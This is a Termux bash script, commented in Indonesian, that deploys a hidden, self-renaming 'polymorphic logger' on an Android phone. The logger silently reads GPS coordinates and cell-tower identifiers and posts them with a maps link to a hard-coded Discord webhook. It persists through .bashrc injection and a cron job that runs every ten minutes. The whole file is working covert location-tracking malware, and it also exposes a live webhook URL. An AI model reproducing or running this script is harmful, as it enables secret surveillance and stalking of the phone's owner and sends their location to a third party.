#!/data/data/com.termux/files/usr/bin/bash

# ─── RANDOM IDENTIFIER ─────────────────────────
RAND=$(tr -dc a-z0-9 </dev/urandom | head -c 8)
BUILDID="SKZ-$(tr -dc A-Z0-9 </dev/urandom | head -c 6)"
FILENAME=".syslog_$RAND.sh"
FULLPATH="$HOME/.syslogs/$FILENAME"
WEBHOOK="https://discord.com/api/webhooks/1298242162709889068/Cw7RQfdXfNH2CpffzljbVz8ZKmJZszEo7c-Y81r-fAIRmAG4oBOhtEZplanALE6L15Cq"

# ─── RANDOM VARIABLE NAME GENERATION ──────────
v1=$(tr -dc a-z_ </dev/urandom | head -c 6)
v2=$(tr -dc a-z_ </dev/urandom | head -c 6)
v3=$(tr -dc a-z_ </dev/urandom | head -c 6)
v4=$(tr -dc a-z_ </dev/urandom | head -c 6)
v5=$(tr -dc a-z_ </dev/urandom | head -c 6)

# ─── BUILD LOGGER FILE ────────────────────────
mkdir -p "$HOME/.syslogs"

cat <<EOF > "$FULLPATH"
#!/data/data/com.termux/files/usr/bin/bash
exec &>/dev/null

# Polymorphic Logger [$BUILDID]
$v1=\$(termux-location -p gps -r last)
$v2=\$(echo "\$$v1" | jq -r '.latitude')
$v3=\$(echo "\$$v1" | jq -r '.longitude')
$v4=\$(termux-telephony-cellinfo)
MCC=\$(echo "\$$v4" | jq -r '[.[] | select(.registered == true)][0].mcc')
MNC=\$(echo "\$$v4" | jq -r '[.[] | select(.registered == true)][0].mnc')
LAC=\$(echo "\$$v4" | jq -r '[.[] | select(.registered == true)][0].tac')
CID=\$(echo "\$$v4" | jq -r '[.[] | select(.registered == true)][0].ci')
$v5=\$(date '+%Y-%m-%d %H:%M:%S')

curl -s -X POST -H "Content-Type: application/json" -d "{
  \\"username\\": \\"SkizaLogger\\",
  \\"content\\": \\"📡 Ping [\$${v5}] (ID: $BUILDID)\\nMCC:\$MCC | MNC:\$MNC | LAC:\$LAC | CID:\$CID\\n📍 [Maps](https://maps.google.com/?q=\$${v2},\$${v3})\\n\\n[Logger: $FILENAME]\"
}" "$WEBHOOK"
EOF

chmod +x "$FULLPATH"

# ─── INJEKSI KE BASHRC & CRON ─────────────────
grep -q "$FILENAME" "$HOME/.bashrc" || echo "bash $FULLPATH &" >> "$HOME/.bashrc"

(crontab -l 2>/dev/null; echo "*/10 * * * * bash $FULLPATH") | crontab -

echo "[✓] Logger polymorphic dengan nama: $FILENAME dan BuildID: $BUILDID telah di-deploy."
